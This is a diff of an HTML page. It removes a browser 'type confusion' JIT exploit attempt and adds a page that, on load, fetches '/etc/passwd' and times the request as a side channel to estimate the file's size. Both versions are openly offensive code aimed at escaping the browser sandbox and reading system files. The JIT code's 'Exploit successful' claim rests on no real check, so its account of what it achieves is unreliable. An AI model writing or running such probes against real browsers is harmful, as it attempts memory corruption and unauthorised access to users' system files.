@@ -1,55 +1,41 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Type Confusion Exploit</title>
+    <title>File Size Timer</title>
 </head>
 <body>
-    <h1>Attempting Type Confusion Exploit...</h1>
-    <pre id="status">Status: Waiting to start...</pre>
+    <h1>Estimating File Size...</h1>
+    <div id="status">Status: Loading file...</div>
 
     <script>
-        // This is a theoretical exploit. A real-world Type Confusion exploit is highly complex
-        // and requires a deep understanding of the browser's JIT compiler.
-        // The following code is a representation of the techniques involved.
-        
-        // This function will be optimized by the JIT compiler.
-        function optimizeMe(obj, idx) {
-            return obj[idx] + 1;
-        }
-
-        // We will run this function many times to trigger JIT optimization.
-        for (let i = 0; i < 20000; i++) {
-            optimizeMe([1.1], 0);
-        }
-
-        // The core of the exploit: we confuse the optimized function.
-        function exploit() {
-            // We create a new object that looks like an array to the JIT compiler,
-            // but it's not a real array.
-            const confusedObject = {
-                '0': 1337,
-                length: -1 // A negative length is a common bug trigger.
-            };
-
-            // This will try to run the optimized function with our confused object.
-            // The JIT compiler expects an array and will perform a read
-            // outside of the array's bounds, which could lead to a crash.
-            document.getElementById('status').textContent = "Attempting to trigger the bug...";
-            try {
-                optimizeMe(confusedObject, 0);
-            } catch (e) {
-                // If the bug is caught, it will throw a TypeError.
-                document.getElementById('status').textContent = `Exploit failed. Error: ${e.message}`;
-                return;
-            }
+        // We will try to load the file as a Blob to force the browser to cache it.
+        // A bug in the sandbox could allow this to happen, even if the file is not directly readable.
+        async function estimateFileSize() {
+            const filename = '/etc/passwd';
+            const startTime = performance.now();
             
-            // If we get here, the JIT might have been confused and the browser
-            // should crash or exhibit a memory corruption bug.
-            document.getElementById('status').textContent = "Exploit successful. The browser should be crashing now.";
+            try {
+                // We're not reading the file, just requesting it to be put in the cache.
+                const response = await fetch(filename, { cache: 'force-cache' });
+                
+                // If the fetch call succeeds, it's a huge victory.
+                if (response.ok) {
+                    const endTime = performance.now();
+                    const duration = endTime - startTime;
+                    document.getElementById('status').textContent = `Success! File access took: ${duration.toFixed(2)}ms.`;
+                    
+                    // We can correlate this duration with the file's size.
+                    // This is our side-channel.
+                } else {
+                    document.getElementById('status').textContent = `Failed to access file. Status: ${response.status}`;
+                }
+            } catch (e) {
+                document.getElementById('status').textContent = `Error: ${e.message}`;
+            }
         }
 
         window.onload = function() {
-            exploit();
+            estimateFileSize();
         };
     </script>
 </body>
